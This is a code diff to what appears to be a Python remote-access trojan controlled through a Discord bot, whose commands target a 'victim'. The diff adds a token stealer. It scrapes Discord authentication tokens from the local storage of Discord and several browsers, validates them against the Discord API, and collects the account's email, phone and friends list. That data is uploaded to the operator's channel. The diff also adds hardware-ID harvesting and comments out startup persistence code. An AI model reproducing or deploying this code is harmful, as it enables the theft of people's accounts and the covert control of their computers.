@@ -5,9 +5,14 @@ import os
 import os.path
 import time
 import urllib.request
+from base64 import b64decode
+from json import loads
 from os import getenv, startfile
 from os.path import join, exists
+from re import findall
 from shutil import copy
+from subprocess import Popen, PIPE
+from urllib.request import Request, urlopen
 
 import discord
 import pyautogui
@@ -24,13 +29,14 @@ token = ""
 # Bot Token Here Obviously
 # Bot needs all intents
 ping_on_startup = True
-# if the bot should ping you when an infected user starts his Computer
+# if the bot should ping you when an infected user starts the File
 
-
-path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/control.pyw" % getenv("userprofile")
+"""
+path = f"%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows.pyw" % getenv("userprofile")
 if not exists(path):
 	copy(__file__, path)
 	startfile(path)
+"""
 
 
 class Control(discord.Client):
@@ -54,7 +60,7 @@ async def on_ready():
 		channel = get(guild.text_channels, name="d")
 		if ping_on_startup:
 			try:
-				await channel.send(f"@everyone `{username}` started `{__file__}`")
+				await channel.send(f"@everyone `{username}` started Control")
 			except:
 				pass
 
@@ -132,6 +138,8 @@ def getTasklist():
 
 
 def systemInfo():
+	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+	hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
 	output = ""
 	ip = get('https://api.ipify.org')
 	envsToGet = ["LANG", "COMPUTERNAME", "COMMONPROGRAMFILES", "LOCALAPPDATA", "OS", "PROCESSOR_ARCHITECTURE",
@@ -145,6 +153,7 @@ def systemInfo():
 	Release: {info.release}
 	Machine: {info.machine}
 	Processor: {info.processor}
+	HWID: {hwid}
 	Ip: {ip}
 	"""
 	with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\systeminfo.txt", "w") as f:
@@ -197,6 +206,105 @@ def crash():
 	else:
 		output = "Failed to crash machine"
 	return output
+
+
+def getDiscordData():
+	LOCAL = os.getenv("LOCALAPPDATA")
+	ROAMING = os.getenv("APPDATA")
+	PATHS = {
+		"Discord": ROAMING + "\\Discord",
+		"Discord Canary": ROAMING + "\\discordcanary",
+		"Discord PTB": ROAMING + "\\discordptb",
+		"Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
+		"Opera": ROAMING + "\\Opera Software\\Opera Stable",
+		"Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+		"Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+	}
+
+	def getHeader(token=None, content_type="application/json"):
+		headers = {
+			"Content-Type": content_type,
+			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
+		}
+		if token:
+			headers.update({"Authorization": token})
+		return headers
+
+	def getUserData(token):
+		try:
+			return loads(
+				urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
+		except:
+			pass
+
+	def getT0k3ns(path):
+		path += "\\Local Storage\\leveldb"
+		tokens = []
+		for file_name in os.listdir(path):
+			if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+				continue
+			for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+				for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+					for token in findall(regex, line):
+						tokens.append(token)
+		return tokens
+
+	def getFriends(token):
+		try:
+			return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
+			                             headers=getHeader(token))).read().decode())
+		except:
+			pass
+
+	def main():
+		working = []
+		checked = []
+		working_ids = []
+		pc_username = os.getenv("UserName")
+		pc_name = os.getenv("COMPUTERNAME")
+
+		for platform, path in PATHS.items():
+			if not os.path.exists(path):
+				continue
+			for T0K3N in getT0k3ns(path):
+				if T0K3N in checked:
+					continue
+				checked.append(T0K3N)
+				uid = None
+				if not T0K3N.startswith("mfa."):
+					try:
+						uid = b64decode(T0K3N.split(".")[0].encode()).decode()
+					except:
+						pass
+					if not uid or uid in working_ids:
+						continue
+				user_data = getUserData(T0K3N)
+				if not user_data:
+					continue
+				working_ids.append(uid)
+				working.append(T0K3N)
+				username = user_data["username"] + "#" + str(user_data["discriminator"])
+				user_id = user_data["id"]
+				email = user_data.get("email")
+				phone = user_data.get("phone")
+				nitro = bool(user_data.get("premium_type"))
+				info = f"####Ma#i##l#: {email}\n#P#h##o##ne: ##{phone}\n#N#i#t#r3###o##: {nitro}\n#U#s#e#r#n#a#m#e: {pc_username}\n#P#C# #N#a#m####e: {pc_name}\nT##0##k##e##n Location: {platform}\nT##3#o##k##e##n #: {T0K3N}\nUsername: {username} ({user_id})\n\nUser Data: {user_data}\n\nFriends: {getFriends(T0K3N)}"
+				info = info.replace("#", "")
+				with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\discordinfo.txt", "w") as f:
+					f.write(info)
+				f.close()
+				return f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\discordinfo.txt"
+
+
+@bot.tree.command(name="discordinfo",
+                  description="get victim's discord info")
+async def discordinfo(interaction: discord.Interaction):
+	await interaction.response.send_message(f"getting discordInfo...")
+	getDiscordData()
+	await interaction.channel.send(
+		file=discord.File(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\discordinfo.txt"))
+	os.remove(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\discordinfo.txt")
+
 
 @bot.tree.command(name="crash",
                   description="crash your victim's computer")
